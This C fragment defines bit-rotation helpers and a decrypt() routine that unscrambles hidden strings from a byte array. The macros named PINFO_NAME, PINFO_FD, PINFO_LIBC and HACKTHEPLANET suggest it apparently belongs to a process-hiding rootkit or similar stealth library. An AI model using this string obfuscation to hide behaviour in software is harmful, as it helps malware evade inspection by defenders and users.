
#include <stdint.h>   // for uint32_t
#include <limits.h>   // for CHAR_BIT

static inline uint8_t rotl (uint8_t n, unsigned int c)
{
  const unsigned int mask = (CHAR_BIT*sizeof(n) - 1);  // assumes width is a power of 2.

  c &= mask;
  return (n<<c) | (n>>( (-c)&mask ));
}

static inline uint8_t rotr (uint8_t n, unsigned int c)
{
  const unsigned int mask = (CHAR_BIT*sizeof(n) - 1);

  c &= mask;
  return (n>>c) | (n<<( (-c)&mask ));
}

static char *decrypt(const char *val, int n) {
    static char buf[256];
    int i=0;
    const char *c = val;
    while (c && i < (int)sizeof(buf) && i < n) {
        int r = i % 14 + 2;
        if (r&1) {
            buf[i++] = (char)rotl((uint8_t)*c, r>>1);
        } else {
            buf[i++] = (char)rotr((uint8_t)*c, r>>1);
        }
        c++;
    }
    buf[i] = 0;
    return buf;
}

const char __ccv[] = {
	0xc2, 0x39, 0x9d, 0x9d, 0xda, 0x06, 0xd5, 0xa3, 0x04, 0x29, 0xdc, 0x28, 0xcc, 0x32, 0xcd, 0x8e, 0x01, 0xa4, 0x46, 0xc2, 0x04, 0x29, 0x19, 0x28, 0xd0, 0xb2, 0x85, 0x19, 0xd1, 0x04, 0x52, 0x07,
	0x41, 0xe0, 0xb4, 0xb9, 0x99, 0x7b, 0x47, 0x02, 0x52, 0x0e, 0x50, 0x90, 0xb0, 0x8d, 0xda, 0x01, 0x8e, 0x86, 0x56, 0x04, 0x82, 0x1b, 0x85, 0x37, 0xca, 0xe8, 0x90, 0x28, 0xd8, 0xb4, 0x89, 0xd8,
	0x01, 0xce, 0x56, 0x27, 0x6e, 0x4b, 0xdb, 0xb9, 0x10, 0x4a, 0xe6, 0x16, 0x80, 0x9c, 0x2b, 0x8d, 0x56, 0x16, 0x6e, 0x2b, 0x08, 0x94, 0xb9, 0x14,
};

#define PINFO_NAME (decrypt(&__ccv[0], 12))
#define PINFO_FD (decrypt(&__ccv[12], 12))
#define PINFO_HEAD (decrypt(&__ccv[24], 9))
#define PINFO_PINFO (decrypt(&__ccv[33], 10))
#define HACKTHEPLANET (decrypt(&__ccv[43], 17))
#define PINFO_LIBC (decrypt(&__ccv[60], 28))